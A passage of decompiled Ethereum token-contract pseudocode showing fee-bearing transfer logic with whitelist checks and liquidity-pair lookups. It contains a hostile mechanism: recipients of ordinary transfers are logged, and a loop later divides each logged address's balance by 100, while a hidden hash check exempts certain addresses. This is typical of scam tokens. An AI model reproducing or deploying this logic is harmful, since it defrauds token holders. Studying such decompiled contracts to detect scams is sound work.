                        mem[(15 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 280 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 0, 17
                            if balanceOf[0] > !(arg2 * _fee / 100):
                                revert with 0, 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                revert with 0, 17
                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor66DE[stor19.length] = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 0, 17
                        if balanceOf[0] > !(arg2 * _fee / 100):
                            revert with 0, 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                            revert with 0, 17
                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor19.length:
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    _7732 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_7732] = 26
                    mem[_7732 + 32] = 'SafeMath: division by zero'
                    if idx >= stor19.length:
                        revert with 0, 50
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                    if idx == -1:
                        revert with 0, 17
                    idx = idx + 1
                    continue 
                stor19.length = 0
                mem[0] = 19
                idx = 0
                while 2 * stor19.length > idx:
                    stor19[idx].field_0 = 0
                    stor19[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(stor10)
                staticcall stor10.factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11540 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _11546 = mem[_11540]
                require mem[_11540] == mem[_11540 + 12 len 20]
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11564 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _11570 = mem[_11564]
                require mem[_11564] == mem[_11564 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_11570)
                require ext_code.size(address(_11546))
                staticcall address(_11546).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_11570)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _11588 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_11588] == mem[_11588 + 12 len 20]
                if arg1 != mem[_11588 + 12 len 20]:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11642 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11658 = mem[_11642]
                    require mem[_11642] == mem[_11642 + 12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11714 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11727 = mem[_11714]
                    require mem[_11714] == mem[_11714 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_11727)
                    require ext_code.size(address(_11658))
                    staticcall address(_11658).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_11727)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11813 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11873 = mem[_11813]
                    require mem[_11813] == mem[_11813 + 12 len 20]
                    if mem[_11813 + 12 len 20] != msg.sender:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _12123 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12123 + 32 len mem[_12123]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_11873):
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _12167 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12167 + 32 len mem[_12167]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 16
                    if stor16[address(msg.sender)]:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _11660 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_11660 + 32 len mem[_11660]]):
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if this.address == arg1:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 0, 17
                                                    if not arg2:
                                                        revert with 0, 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor10)
                                                    staticcall stor10.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor66DE[stor19.length] = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 0, 17
                                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                                        revert with 0, 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                        revert with 0, 17
                                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11648 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11684 = mem[_11648]
                        require mem[_11648] == mem[_11648 + 12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11720 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11740 = mem[_11720]
                        require mem[_11720] == mem[_11720 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_11740)
                        require ext_code.size(address(_11684))
                        staticcall address(_11684).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_11740)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11844 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11898 = mem[_11844]
                        require mem[_11844] == mem[_11844 + 12 len 20]
                        if mem[_11844 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12172 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12172 + 32 len mem[_12172]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_11898):
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
